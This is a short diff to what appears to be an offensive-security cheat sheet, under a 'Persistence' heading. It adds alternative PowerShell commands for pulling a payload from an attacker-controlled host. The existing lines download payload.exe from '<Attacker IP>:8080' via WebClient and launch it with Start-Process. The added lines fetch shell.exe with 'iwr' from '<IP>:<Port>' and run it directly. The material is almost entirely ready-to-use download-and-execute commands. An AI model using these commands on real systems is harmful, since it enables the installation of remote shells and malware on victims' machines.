@@ -35,9 +35,18 @@ Persistence
 
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<Attacker IP>:8080/payload.exe','payload.exe')"
+
+OR
+
+powershell iwr -Uri http://<IP>:<Port> -OutFile shell.exe
 ```
 
 ```
 # Executing the payload
 Start-Process "payload.exe"
+
+OR
+
+.\shell.exe
 ```
+
